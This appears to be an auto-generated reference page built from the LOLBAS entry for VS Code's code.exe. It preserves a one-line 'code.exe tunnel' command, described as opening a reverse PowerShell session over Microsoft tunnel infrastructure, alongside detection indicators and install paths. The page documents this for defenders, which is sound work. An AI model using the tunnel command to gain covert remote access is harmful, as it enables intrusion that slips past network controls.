---
parsed_by: focuslocust
source: lolbas
type: generated
---
# code.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `code.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/HonorableMentions/Code.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [code.exe](../../tools/windows/code.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | code.exe |
| name | code.exe |
| type | tool |
| source | lolbas |
| url | https://badoption.eu/blog/2023/01/31/code_c2.html |

## Preserved Source Material

```yaml
Author: PfiatDe
Commands:
- Category: Execute
  Command: code.exe tunnel --accept-server-license-terms --name "tunnel-name"
  Description: Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command
  MitreID: T1219.001
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Reverse PowerShell session over MS provided infrastructure.
Created: 2023-02-01
Description: VSCode binary, also portable (CLI) version
Detection:
- IOC: Websocket traffic to global.rel.tunnels.api.visualstudio.com
- IOC: 'Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe'
- IOC: 'File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json'
Full_Path:
- Path: C:\Users\<username>\AppData\Local\Programs\Microsoft VS Code\Code.exe
- Path: C:\Program Files\Microsoft VS Code\Code.exe
- Path: C:\Program Files (x86)\Microsoft VS Code\Code.exe
Name: code.exe
Resources:
- Link: https://badoption.eu/blog/2023/01/31/code_c2.html
- Link: https://code.visualstudio.com/docs/remote/tunnels
- Link: https://code.visualstudio.com/blogs/2022/12/07/remote-even-better
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/HonorableMentions/Code.yml
```

## Detection / Analysis Notes

```text
IOC: File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json
```

```text
IOC: Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe
```

```text
IOC: Websocket traffic to global.rel.tunnels.api.visualstudio.com
```

```text
- IOC: Websocket traffic to global.rel.tunnels.api.visualstudio.com
- IOC: 'Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe'
- IOC: 'File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json'
```
